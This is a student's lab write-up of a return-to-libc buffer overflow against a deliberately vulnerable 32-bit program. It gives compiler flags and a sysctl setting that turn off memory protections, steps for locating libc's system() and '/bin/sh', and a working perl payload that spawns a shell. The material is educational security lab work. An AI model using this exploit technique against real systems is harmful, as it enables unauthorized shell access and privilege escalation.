## What I learned:
This buffer overflow lab taught me how to modify memory locations in order to overflow into return pointers. Additionally, I learned how to perform an "Return to System" attack in order to get around the non-executable stack protection. The most difficult part of the lab was determining where the libC System library was located in memory and using the System offset to get there. I also had to use the `objdump` terminal command to disassemble the vuln.c code in order to determine where variables a,b,c,d and the location of the function "exploitable" was in memory. The following is the method I eventually used to execute this attack.

### Configuration
After spending many hours trying to find an old Linux image that would work on Virtual Box, I was unsuccessful. I eventually decided to try the return-to-libc exploit on my main Desktop and I found I did not need to use a virtual machine to make this exploit work.  I was able to use my desktop Ubuntu 22.04 64-bit machine. Here are the GCC flags required to make this work:
* Position Independent Executable (PIE) must be disabled 
`-no-pie`
* Stack Protector must be disabled
`-fno-stack-protector`
* Binary must be compiled in 32-bit
`-m32`
* Kernel randomization of memory addresses must be disabled in /etc/sysctl.conf:
```
# Do not randomize memory addresses
kernel.randomize_va_space = 0
```

## INSTRUCTIONS:

Compile using gcc flags to turn off protections:

`gcc vuln.c -o vuln -fno-stack-protector -no-pie -m32`

### STEP 0: Calculate the padding required to overrun the buffer in vuln by passing in strings of increasing length and observing the return pointer of the program  

`./vuln AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH`

`dmesg`

    [14270.359034] vuln[18179]: segfault at 47474746 ip 0000000047474746 sp 00000000ff99b670 error 14 in libc.so.6[f7c00000+20000]
### STEP 1: Find out which version of libC vuln is using

`ldd vuln`

        linux-gate.so.1 (0xf7f96000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7f98000)

### STEP 2: Grab the base address of libC from above

    Base Address = 0xf7c00000

### STEP 3: Find the system offset in libC

`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`
  
    2166: 00048150    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0

### STEP 4: Calculate the actual address of the libC system()

    f7c00000 (base addr) + 00048150 (offset) = F7C48150 (actual address)

### STEP 5: Find the offset of the string "/bin/sh" in libC library

`strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"`

    1bd0f5 /bin/sh

### STEP 6: Calculate the actual address of the string "/bin/sh" inside the libC library:
    f7c00000 (libC base addr) + 1bd0f5 (string offset) = F7DBD0F5


### STEP 7: Build the payload
[      22 x "A" characters      ][  system() address  ][ 8-byte Spacing ][ '/bin/sh' address ]


`./vuln $(perl -e 'print "A"x22 . "\x50\x81\xc4\xf7" . "BBBB\x00\x00\x00\x00" . "\xf5\xd0\xdb\xf7"')`

### STEP 8: pack the payload into exploit.c
the code exploit.c will call libC.system() using the payload above, causing a shell to be spawned using the permissions of the vuln process.

Compile exploit.c

`gcc exploit.c -o exploit -fno-stack-protector -no-pie -m32`

### SCREEN RECORDING:
I recorded the usage of the exploit on my Ubuntu 22.04 64-bit machine, the file is:
`screen_recording_Hunter_Ruebsamen.mkv`